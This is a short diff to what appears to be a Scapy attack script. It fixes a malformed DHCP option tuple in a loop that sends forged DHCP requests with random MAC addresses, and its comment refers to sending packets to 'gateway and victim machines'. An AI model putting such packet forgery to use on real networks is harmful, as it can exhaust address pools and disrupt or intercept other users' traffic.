@@ -29,7 +29,7 @@ for i in range(100,201):
                     UDP(sport=68, dport=67)/\
                     BOOTP(chaddr=RandString(12, '0123456789abcdef'))/\
                     DHCP(options=[('message-type','request'),\
-                                   'requested_addr', ipaddr),\
+                                  ('requested_addr', ipaddr),\
                                    'end'])
 
   # send the two packets for gateway and victim machines
